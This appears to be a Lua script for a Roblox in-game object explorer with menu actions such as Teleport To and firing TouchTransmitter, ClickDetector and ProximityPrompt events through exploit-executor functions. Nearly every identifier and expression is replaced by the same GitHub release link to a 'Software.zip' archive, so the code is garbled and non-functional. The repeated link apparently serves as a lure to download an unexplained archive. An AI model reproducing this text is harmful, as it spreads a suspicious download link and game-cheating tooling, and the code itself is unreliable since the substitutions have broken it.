				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,0,20)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = tostring(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,depth,0,0)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-depth,1,0)

				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = (https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)

				if (isa(obj,"LocalScript") or isa(obj,"Script")) and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, isa(obj,"LocalScript") and "LocalScript_Disabled" or "Script_Disabled")
				else
					local rmdEntry = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip]
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, rmdEntry and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or 0)
				end

				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[node] then
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0
				else
					if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(entry) then
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
					else
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 1
					end
				end

				if node == renamingNode then
					renameNodeVisible = true
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,depth+https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip+2)
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true
				end

				if #node > 0 and expanded[node] ~= 0 then
					if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) then
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, expanded[node] and "Collapse_Over" or "Expand_Over")
					else
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, expanded[node] and "Collapse" or "Expand")
					end
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true
				else
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
				end
			else
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
			end
		end

		if not renameNodeVisible then
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
		end

		for i = maxNodes+1, #listEntries do
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(listEntries[i])
			listEntries[i]:Destroy()
			listEntries[i] = nil
		end
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(instant)
		updateDebounce = true
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(not instant and 0.1)
		if not updateDebounce then return end
		updateDebounce = false
		if not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip() then return end
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(norefresh)
		updateDebounce = false
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		if not norefresh then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip() end
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function()
		refreshDebounce = true
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.1)
		refreshDebounce = false
		if updateDebounce or not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip() then return end
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(node)
		if not node then return end

		local curNode = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		while curNode do
			if not expanded[curNode] then return false end
			curNode = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		end
		return true
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(node)
		local depth = 0

		if node == nilNode then
			return 1
		end

		local curNode = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		while curNode do
			if curNode == nilNode then depth = depth + 1 end
			curNode = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			depth = depth + 1
		end
		return depth
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function()
		if descendantAddedCon then descendantAddedCon:Disconnect() end
		if descendantRemovingCon then descendantRemovingCon:Disconnect() end
		if itemChangedCon then itemChangedCon:Disconnect() end

		if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
			descendantAddedCon = game["Run Service"]https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(addObject)
			descendantRemovingCon = game["Run Service"]https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(removeObject)
		else
			descendantAddedCon = game["Run Service"]https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(obj) pcall(addObject,obj) end)
			descendantRemovingCon = game["Run Service"]https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(obj) pcall(removeObject,obj) end)
		end

		if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
			itemChangedCon = game["Run Service"]https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(obj,prop)
				if prop == "Parent" and nodes[obj] then
					moveObject(obj)
				elseif prop == "Name" and nodes[obj] then
					nodes[obj].NameWidth = nil
				end
			end)
		else
			itemChangedCon = game["Run Service"]https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(obj,prop)
				if prop == "Parent" and nodes[obj] then
					moveObject(obj)
				end
			end)
		end
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(node)
		if not node then return end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(node)
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(true)
		local visibleSpace = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

		for i,v in next,tree do
			if v == node then
				local relative = i - 1
				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip > relative then
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = relative
				elseif https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip + visibleSpace - 1 <= relative then
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = relative - visibleSpace + 2
				end
			end
		end

		scrollV:Update() https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(obj)
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(nodes[obj])
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(node,expandRoot)
		if not node then return end

		local hasExpanded = false

		if expandRoot and not expanded[node] then
			expanded[node] = true
			hasExpanded = true
		end

		local currentNode = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		while currentNode do
			hasExpanded = true
			expanded[currentNode] = true
			currentNode = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		end

		if hasExpanded and not updateDebounce then
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)(true)
		end
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function()
		local context = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		context:Clear()

		local sList = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local sMap = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local emptyClipboard = #clipboard == 0
		local presentClasses = {}
		local apiClasses = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

		for i = 1, #sList do
			local node = sList[i]
			local class = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			if not class then class = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = class end
			local curClass = apiClasses[class]
			while curClass and not presentClasses[https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip] do
				presentClasses[https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip] = true
				curClass = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			end
		end

		context:AddRegistered("CUT")
		context:AddRegistered("COPY")
		context:AddRegistered("PASTE", emptyClipboard)
		context:AddRegistered("DUPLICATE")
		context:AddRegistered("DELETE")
		context:AddRegistered("RENAME", #sList ~= 1)

		context:AddDivider()
		context:AddRegistered("GROUP")
		context:AddRegistered("UNGROUP")
		context:AddRegistered("SELECT_CHILDREN")
		context:AddRegistered("JUMP_TO_PARENT")
		context:AddRegistered("EXPAND_ALL")
		context:AddRegistered("COLLAPSE_ALL")

		context:AddDivider()
		if expanded == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then context:AddRegistered("CLEAR_SEARCH_AND_JUMP_TO") end
		if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then context:AddRegistered("COPY_PATH") end
		context:AddRegistered("INSERT_OBJECT")
		context:AddRegistered("SAVE_INST")
		context:AddRegistered("CALL_FUNCTION")
		context:AddRegistered("VIEW_CONNECTIONS")
		context:AddRegistered("GET_REFERENCES")
		context:AddRegistered("VIEW_API")
		
		context:QueueDivider()

		if presentClasses["BasePart"] or presentClasses["Model"] then
			context:AddRegistered("TELEPORT_TO")
			context:AddRegistered("VIEW_OBJECT")
		end

		if presentClasses["TouchTransmitter"] then context:AddRegistered("FIRE_TOUCHTRANSMITTER", firetouchinterest == nil) end
		if presentClasses["ClickDetector"] then context:AddRegistered("FIRE_CLICKDETECTOR", fireclickdetector == nil) end
		if presentClasses["ProximityPrompt"] then context:AddRegistered("FIRE_PROXIMITYPROMPT", fireproximityprompt == nil) end
		if presentClasses["Player"] then context:AddRegistered("SELECT_CHARACTER") end
		if presentClasses["Players"] then context:AddRegistered("SELECT_LOCAL_PLAYER") end
		if presentClasses["LuaSourceContainer"] then context:AddRegistered("VIEW_SCRIPT") end

		if sMap[nilNode] then
			context:AddRegistered("REFRESH_NIL")
			context:AddRegistered("HIDE_NIL")
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		context:Show()
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function()
		local context = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()

		context:Register("CUT",{Name = "Cut", IconMap = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, Icon = "Cut", DisabledIcon = "Cut_Disabled", Shortcut = "Ctrl+Z", OnClick = function()
			local destroy,clone = game["Run Service"]https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,game["Run Service"]https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local sList,newClipboard = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,{}
			local count = 1
			for i = 1,#sList do
				local inst = sList[i].Obj
				local s,cloned = pcall(clone,inst)
				if s and cloned then
					newClipboard[count] = cloned
					count = count + 1
				end
				pcall(destroy,inst)
			end
			clipboard = newClipboard
			selection:Clear()
		end})

		context:Register("COPY",{Name = "Copy", IconMap = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, Icon = "Copy", DisabledIcon = "Copy_Disabled", Shortcut = "Ctrl+C", OnClick = function()
			local clone = game["Run Service"]https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local sList,newClipboard = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,{}
			local count = 1
			for i = 1,#sList do
				local inst = sList[i].Obj
				local s,cloned = pcall(clone,inst)
				if s and cloned then
					newClipboard[count] = cloned
					count = count + 1
				end
			end
			clipboard = newClipboard
		end})

		context:Register("PASTE",{Name = "Paste Into", IconMap = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, Icon = "Paste", DisabledIcon = "Paste_Disabled", Shortcut = "Ctrl+Shift+V", OnClick = function()
			local sList = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local newSelection = {}
			local count = 1
			for i = 1,#sList do
				local node = sList[i]
				local inst = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(node,true)
				for c = 1,#clipboard do
					local cloned = clipboard[c]:Clone()
					if cloned then
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = inst
						local clonedNode = nodes[cloned]
						if clonedNode then newSelection[count] = clonedNode count = count + 1 end
					end
				end
			end
			selection:SetTable(newSelection)

			if #newSelection > 0 then
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(newSelection[1])
			end
		end})

		context:Register("DUPLICATE",{Name = "Duplicate", IconMap = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, Icon = "Copy", DisabledIcon = "Copy_Disabled", Shortcut = "Ctrl+D", OnClick = function()
			local clone = game["Run Service"]https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local sList = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local newSelection = {}
			local count = 1
			for i = 1,#sList do
				local node = sList[i]
				local inst = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				local instPar = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(node)
				local s,cloned = pcall(clone,inst)
				if s and cloned then
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = instPar
					local clonedNode = nodes[cloned]
					if clonedNode then newSelection[count] = clonedNode count = count + 1 end
				end
			end

			selection:SetTable(newSelection)
			if #newSelection > 0 then
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(newSelection[1])
			end
		end})

		context:Register("DELETE",{Name = "Delete", IconMap = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, Icon = "Delete", DisabledIcon = "Delete_Disabled", Shortcut = "Del", OnClick = function()
			local destroy = game["Run Service"]https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local sList = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			for i = 1,#sList do
				pcall(destroy,sList[i].Obj)
			end
			selection:Clear()
		end})

		context:Register("RENAME",{Name = "Rename", IconMap = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, Icon = "Rename", DisabledIcon = "Rename_Disabled", Shortcut = "F2", OnClick = function()
			local sList = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			if sList[1] then
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(sList[1])
			end
		end})

		context:Register("GROUP",{Name = "Group", IconMap = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, Icon = "Group", DisabledIcon = "Group_Disabled", Shortcut = "Ctrl+G", OnClick = function()
			local sList = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			if #sList == 0 then return end

			local model = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("Model",sList[#sList]https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
			for i = 1,#sList do
				pcall(function() sList[i]https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = model end)
			end

			if nodes[model] then
				selection:Set(nodes[model])
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(nodes[model])
			end
		end})

		context:Register("UNGROUP",{Name = "Ungroup", IconMap = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, Icon = "Ungroup", DisabledIcon = "Ungroup_Disabled", Shortcut = "Ctrl+U", OnClick = function()
			local newSelection = {}
			local count = 1
			local isa = game["Run Service"]https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

			local function ungroup(node)
				local par = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				local ch = {}
				local chCount = 1

				for i = 1,#node do
					local n = node[i]
					newSelection[count] = n
					ch[chCount] = n
					count = count + 1
					chCount = chCount + 1
				end

				for i = 1,#ch do
					pcall(function() ch[i]https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = par end)
				end

				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			end

			for i,v in next,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip do
				if isa(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,"Model") then
					ungroup(v)
				end
			end

			selection:SetTable(newSelection)
			if #newSelection > 0 then
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(newSelection[1])
			end
		end})

		context:Register("SELECT_CHILDREN",{Name = "Select Children", IconMap = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, Icon = "SelectChildren", DisabledIcon = "SelectChildren_Disabled", OnClick = function()
			local newSelection = {}
			local count = 1
			local sList = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

			for i = 1,#sList do
				local node = sList[i]
				for ind = 1,#node do
					local cNode = node[ind]
					if ind == 1 then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(cNode) end

					newSelection[count] = cNode
					count = count + 1
				end
			end

			selection:SetTable(newSelection)
			if #newSelection > 0 then
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(newSelection[1])
			else
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			end
		end})

		context:Register("JUMP_TO_PARENT",{Name = "Jump to Parent", IconMap = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, Icon = "JumpToParent", OnClick = function()
			local newSelection = {}
			local count = 1
			local sList = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

			for i = 1,#sList do
				local node = sList[i]
				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
					newSelection[count] = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
					count = count + 1
				end
			end

			selection:SetTable(newSelection)
			if #newSelection > 0 then
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(newSelection[1])
			else
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			end
		end})

		context:Register("TELEPORT_TO",{Name = "Teleport To", IconMap = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, Icon = "TeleportTo", OnClick = function()
			local sList = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local isa = game["Run Service"]https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

			local hrp = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("HumanoidRootPart")
			if not hrp then return end

			for i = 1,#sList do
				local node = sList[i]

				if isa(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,"BasePart") then
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip + https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
					break
				elseif isa(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,"Model") then
					if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip + https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
						break
					else
						local part = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("BasePart",true)
						if part and nodes[part] then
							https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = nodes[part]https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip + https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
						end
					end
				end
			end
		end})

		context:Register("EXPAND_ALL",{Name = "Expand All", OnClick = function()
			local sList = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

			local function expand(node)
				expanded[node] = true
				for i = 1,#node do
					if #node[i] > 0 then
						expand(node[i])
					end
				end
			end

			for i = 1,#sList do
				expand(sList[i])
			end

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		end})

		context:Register("COLLAPSE_ALL",{Name = "Collapse All", OnClick = function()
			local sList = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

			local function expand(node)
				expanded[node] = nil
				for i = 1,#node do
					if #node[i] > 0 then
						expand(node[i])
					end
				end
			end

			for i = 1,#sList do
				expand(sList[i])
			end

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		end})

		context:Register("CLEAR_SEARCH_AND_JUMP_TO",{Name = "Clear Search and Jump to", OnClick = function()
			local newSelection = {}
			local count = 1
			local sList = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

			for i = 1,#sList do
				newSelection[count] = sList[i]
				count = count + 1
			end

			selection:SetTable(newSelection)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			if #newSelection > 0 then
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(newSelection[1])
			end
		end})

		local clth = function(str)
			if str:sub(1, 28) == "game:GetService(\"Workspace\")" then str = str:gsub("game:GetService%(\"Workspace\"%)", "workspace", 1) end
			if str:sub(1, 27 + https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) == "game:GetService(\"Players\")." .. https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then str = str:gsub("game:GetService%(\"Players\"%)." .. https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, "game:GetService(\"Players\").LocalPlayer", 1) end
			return str
		end

		context:Register("COPY_PATH",{Name = "Copy Path", OnClick = function()
			local sList = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			if #sList == 1 then
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(clth(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(sList[1].Obj)))
			elseif #sList > 1 then
				local resList = {"{"}
				local count = 2
				for i = 1,#sList do
					local path = "\t"https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(sList[i].Obj))..","
					if #path > 0 then
						resList[count] = path
						count = count+1
					end
				end
				resList[count] = "}"
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(resList,"\n"))
			end
		end})

		context:Register("INSERT_OBJECT",{Name = "Insert Object", IconMap = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, Icon = "InsertObject", OnClick = function()
			local mouse = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local x,y = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or mouse.X, https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or mouse.Y
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(x,y)
		end})

		context:Register("CALL_FUNCTION",{Name = "Call Function", IconMap = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, Icon = 66, OnClick = function()

		end})

		context:Register("GET_REFERENCES",{Name = "Get Lua References", IconMap = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, Icon = 34, OnClick = function()

		end})

		context:Register("SAVE_INST",{Name = "Save to File", IconMap = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, Icon = "Save", OnClick = function()

		end})

		context:Register("VIEW_CONNECTIONS",{Name = "View Connections", OnClick = function()

		end})

		context:Register("VIEW_API",{Name = "View API Page", IconMap = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, Icon = "Reference", OnClick = function()

		end})

		context:Register("VIEW_OBJECT",{Name = "View Object (Right click to reset)", IconMap = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, Icon = 5, OnClick = function()
			local sList = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local isa = game["Run Service"]https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

			for i = 1,#sList do
				local node = sList[i]

				if isa(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,"BasePart") or isa(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,"Model") then
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
					break
				end
			end
		end, OnRightClick = function()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		end})

		context:Register("FIRE_TOUCHTRANSMITTER",{Name = "Fire TouchTransmitter", IconMap = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, Icon = 37, OnClick = function()
			local hrp = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("HumanoidRootPart")
			if not hrp then return end
			for _, v in ipairs(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) do if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("TouchTransmitter") then firetouchinterest(hrp, https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, 0) end end
		end})

		context:Register("FIRE_CLICKDETECTOR",{Name = "Fire ClickDetector", IconMap = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, Icon = 41, OnClick = function()
			local hrp = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("HumanoidRootPart")
			if not hrp then return end
			for _, v in ipairs(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) do if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("ClickDetector") then fireclickdetector(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) end end
		end})

		context:Register("FIRE_PROXIMITYPROMPT",{Name = "Fire ProximityPrompt", IconMap = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, Icon = 124, OnClick = function()
			local hrp = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("HumanoidRootPart")
			if not hrp then return end
			for _, v in ipairs(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) do if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("ProximityPrompt") then fireproximityprompt(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) end end
		end})

		context:Register("VIEW_SCRIPT",{Name = "View Script", IconMap = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, Icon = "ViewScript", OnClick = function()
			local scr = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[1] and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[1].Obj
			if scr then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(scr) end
		end})

		context:Register("SELECT_CHARACTER",{Name = "Select Character", IconMap = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, Icon = 9, OnClick = function()
			local newSelection = {}
			local count = 1
			local sList = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local isa = game["Run Service"]https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

			for i = 1,#sList do
				local node = sList[i]
				if isa(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,"Player") and nodes[https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip] then
					newSelection[count] = nodes[https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip]
					count = count + 1
				end
			end

